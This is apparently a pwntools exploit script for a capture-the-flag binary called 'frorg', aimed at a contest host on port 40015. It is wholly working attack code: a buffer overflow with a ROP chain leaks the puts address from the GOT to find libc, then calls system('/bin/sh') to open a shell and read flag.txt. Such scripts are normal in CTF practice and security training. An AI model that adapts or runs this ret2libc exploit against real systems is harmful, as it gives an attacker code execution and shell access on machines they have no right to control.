#!/usr/bin/env python3

from pwn import *
import time
import sys

local = 0
debug = 0

context.arch = 'amd64'
# context.aslr = False
context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# context.timeout = 2

def conn():
	global local
	global debug

	for arg in sys.argv[1:]:
		if arg in ('-h', '--help'):
			print('Usage: python ' + sys.argv[0] + ' <option> ...')
			print('Option:')
			print('        -h, --help:     Show help')
			print('        -l, --local:    Running on local')
			print('        -d, --debug:    Use gdb auto attach')
			exit(0)
		if arg in ('-l', '--local'):
			local = 1
		if arg in ('-d', '--debug'):
			debug = 1

	if local:
		s = process('./frorg_patched')
		if debug:
			gdb.attach(s, gdbscript='''
              b* 0x000000000040127A
              c
              ''')
		else:
			raw_input('DEBUG')
	else:
		s = remote('byuctf.xyz', 40015)

	return s

s = conn()

elf = ELF('./frorg_patched')
libc = ELF('libc.so.6')

pop_rdi = 0x00000000004011e5
ret = 0x000000000040101a
pop_rbp = 0x000000000040117d
leave_ret = 0x000000000040128e

payload = b'10'
s.sendlineafter(b'store? \n', payload)

def inp(content):
    s.sendafter(b'name: \n', content)

for i in range(4):
    inp(b'A'*10)

inp(b'A')
inp(b'A'*6 +p64(pop_rdi)+p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.sym['main']))
s.send(b'\x00')
s.recvuntil(b'Thank you!\n')

puts_leak = s.recvline().strip(b'\n')
puts_leak = u64(puts_leak.ljust(8, b'\x00'))

libc_leak = puts_leak - libc.sym['puts']
log.info('puts_leak : ' + hex(puts_leak))
sleep(2)
log.info('libc_leak : ' + hex(libc_leak))

system = libc_leak + libc.sym['system']
bin_sh = libc_leak + next(libc.search(b'/bin/sh\x00'))
exit = libc_leak + libc.sym['exit']
s.sendlineafter(b'store? \n', payload)

def inp(content):
    s.sendafter(b'name: \n', content)

for i in range(4):
    inp(b'A'*10)

inp(b'A')
inp(b'A'*6 + p64(ret) + p64(pop_rdi)+p64(bin_sh) + p64(system) + p64(exit))
s.sendline(b'\x00')
s.sendline(b'id')
s.sendline(b'ls')
s.sendline(b'cat flag.txt')
s.interactive()

